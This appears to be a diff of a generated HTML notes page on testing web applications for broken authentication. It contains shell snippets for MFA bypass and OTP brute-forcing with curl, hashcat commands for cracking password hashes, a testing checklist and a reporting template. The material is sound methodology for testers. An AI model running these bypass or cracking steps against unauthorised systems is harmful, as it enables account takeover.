-copyBtnbtn_c1c565c150f74a0da62eb3608754a781.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# MFA bypass via direct endpoint access — skip the OTP step entirely\ncurl http://$IP/dashboard -H \"Authorization: Bearer $PARTIAL_AUTH_TOKEN\"\n\n# OTP brute force — check for rate limiting on the code itself\nfor i in {000000..000010}; do\n  curl -s -X POST http://$IP/verify-otp -d \"code=$i\" -o /dev/null -w \"%{http_code}\\n\"\ndone\n\n# Response manipulation — intercept the MFA check response in Burp\n# and change false to true / 0 to 1 if validation happens client-side\n\n# Backup code reuse — test if a used backup code can be reused\n`);copyBtnbtn_c1c565c150f74a0da62eb3608754a781.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_c1c565c150f74a0da62eb3608754a781.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_cbca75d1e73f44389a44a1968a93cf27=document.querySelector('button[name=btn_cbca75d1e73f44389a44a1968a93cf27]');
+copyBtnbtn_cbca75d1e73f44389a44a1968a93cf27.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# MFA bypass via direct endpoint access — skip the OTP step entirely\ncurl http://$IP/dashboard -H \"Authorization: Bearer $PARTIAL_AUTH_TOKEN\"\n\n# OTP brute force — check for rate limiting on the code itself\nfor i in {000000..000010}; do\n  curl -s -X POST http://$IP/verify-otp -d \"code=$i\" -o /dev/null -w \"%{http_code}\\n\"\ndone\n\n# Response manipulation — intercept the MFA check response in Burp\n# and change false to true / 0 to 1 if validation happens client-side\n\n# Backup code reuse — test if a used backup code can be reused\n`);copyBtnbtn_cbca75d1e73f44389a44a1968a93cf27.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_cbca75d1e73f44389a44a1968a93cf27.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1202,20 +1220,20 @@ See <a href="20260212T064723==mfa--multi-factor-authentication__concept_cybersec
 </p>
 </div>
 </div>
-<div id="outline-container-orgacf0e37" class="outline-2">
-<h2 id="orgacf0e37">5. Weak Credential Storage</h2>
-<div class="outline-text-2" id="text-orgacf0e37">
+<div id="outline-container-org5abac45" class="outline-2">
+<h2 id="org5abac45">5. Weak Credential Storage</h2>
+<div class="outline-text-2" id="text-org5abac45">
 <p>
 Not directly testable via the application itself but relevant if
 you obtain the database (via SQLi, backup file exposure, etc.):
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_8b347502051c46ec88602628cccd7933>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_d6568dab13964315bccb2c788be0fa4e>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_8b347502051c46ec88602628cccd7933=document.querySelector('button[name=btn_8b347502051c46ec88602628cccd7933]');
-copyBtnbtn_8b347502051c46ec88602628cccd7933.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Identify hash type\nhashid '$1$xyz$abc...'\n\n# Crack with appropriate mode\nhashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt     # MD5\nhashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt  # bcrypt\nhashcat -m 1400 hashes.txt /usr/share/wordlists/rockyou.txt  # SHA256\n`);copyBtnbtn_8b347502051c46ec88602628cccd7933.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_8b347502051c46ec88602628cccd7933.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_d6568dab13964315bccb2c788be0fa4e=document.querySelector('button[name=btn_d6568dab13964315bccb2c788be0fa4e]');
+copyBtnbtn_d6568dab13964315bccb2c788be0fa4e.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Identify hash type\nhashid '$1$xyz$abc...'\n\n# Crack with appropriate mode\nhashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt     # MD5\nhashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt  # bcrypt\nhashcat -m 1400 hashes.txt /usr/share/wordlists/rockyou.txt  # SHA256\n`);copyBtnbtn_d6568dab13964315bccb2c788be0fa4e.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_d6568dab13964315bccb2c788be0fa4e.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1234,9 +1252,9 @@ See <a href="20260206T060656--hashing__concept_cybersecurity_programming.html">H
 </p>
 </div>
 </div>
-<div id="outline-container-orge2f1144" class="outline-2">
-<h2 id="orge2f1144">6. Testing Checklist</h2>
-<div class="outline-text-2" id="text-orge2f1144">
+<div id="outline-container-orgabb5080" class="outline-2">
+<h2 id="orgabb5080">6. Testing Checklist</h2>
+<div class="outline-text-2" id="text-orgabb5080">
 <ul class="org-ul">
 <li class="off"><code>[&#xa0;]</code> Compare login error messages for username enumeration</li>
 <li class="off"><code>[&#xa0;]</code> Test registration form for username disclosure</li>
@@ -1251,9 +1269,9 @@ See <a href="20260206T060656--hashing__concept_cybersecurity_programming.html">H
 </ul>
 </div>
 </div>
-<div id="outline-container-orgdedb26f" class="outline-2">
-<h2 id="orgdedb26f">7. Reporting Template</h2>
-<div class="outline-text-2" id="text-orgdedb26f">
+<div id="outline-container-orge1125ea" class="outline-2">
+<h2 id="orge1125ea">7. Reporting Template</h2>
+<div class="outline-text-2" id="text-orge1125ea">
 <p>
 <b>Classification:</b> Broken Authentication
 </p>
@@ -1276,7 +1294,7 @@ reset token to take over an account].
 <p>
 <b>Evidence:</b>
 </p>
-<pre class="example" id="org65d56db">
+<pre class="example" id="org5df2cb5">
 POST /login HTTP/1.1
 username=admin&amp;password=wrong1
 
@@ -1303,9 +1321,9 @@ failures, keyed by username not just source IP</li>
 </ul>
 </div>
 </div>
-<div id="outline-container-org3d3046f" class="outline-2">
-<h2 id="org3d3046f">Tips</h2>
-<div class="outline-text-2" id="text-org3d3046f">
+<div id="outline-container-org5727fd6" class="outline-2">
+<h2 id="org5727fd6">Tips</h2>
+<div class="outline-text-2" id="text-org5727fd6">
 <ul class="org-ul">
 <li>Differing error messages are the most commonly overlooked
 enumeration vector — always diff the response text byte for byte</li>
@@ -1324,6 +1342,20 @@ for IP identification</li>
 </div>
 </div>
 <div id="postamble" class="status">
+<div id='generated-footer' class='generated'><footer>
+ <nav>
+<div class='separator'></div>
+<a class='nav-author'href='https://gregoryhugaerts.github.io' >
+gregoryhugaerts.github.io
+</a>
+<input id='nav-toggle-bot' class='nav-toggle' type='checkbox'>
+<label class='nav-button' for='nav-toggle-bot'><span/></label>
+<div class='separator menu-sep'></div>
+<ul class='nav-list'>
+</ul>
+</nav>
+</footer>
+</div>
 <script type="text/javascript">
 <!--/*--><![CDATA[/*><!--*/
 if (!document.cookie.split('; ').find(r => r.startsWith('mode'))) {
@@ -1331,6 +1363,7 @@ document.cookie = 'mode=dark'
 }
 document.cookie = 'light=modus-operandi-tinted'
 document.cookie = 'dark=modus-vivendi-tinted'
+document.cookie = 'options=collapsing:t__src-lang:t';
 /*
 ;; nice-org-html.js
 ;;==============================================================================
